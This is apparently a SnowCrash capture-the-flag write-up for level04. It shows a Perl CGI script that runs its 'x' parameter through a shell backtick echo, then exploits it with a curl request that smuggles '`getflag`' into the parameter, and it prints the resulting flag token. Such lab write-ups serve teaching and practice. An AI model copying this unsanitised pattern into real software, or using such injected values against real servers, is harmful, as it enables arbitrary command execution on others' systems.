# Level04

## Hint

There appears to be a server running on `localhost:4747`, perhaps you can use it to get the flag.

## Answer

Let's check our current directory:
```
level04@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout*
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
-r-x------  1 level04 level04  675 Apr  3  2012 .profile*
```

Great ! We found an executable file, let's run it first !
```
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html


```

Hmm, so nothing happened. Since this is a perl script, we can actually just read it:
```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Alright, from this code we can see that the server is running on `localhost:4747`, futhermore it takes the value of the `x` parameter and prints that value such as:
```
level04@SnowCrash:~$ curl localhost:4747/?x=hello
hello
```

As expected. We can now get the flag by running the following command:
```
level04@SnowCrash:~$ curl localhost:4747/?x='`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

The reason why this works is because we added [backticks](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands) so that the command will be evaluated before the `echo` command is executed, moreover we add single quotes so that it evualuates the command on the server and now in our current shell.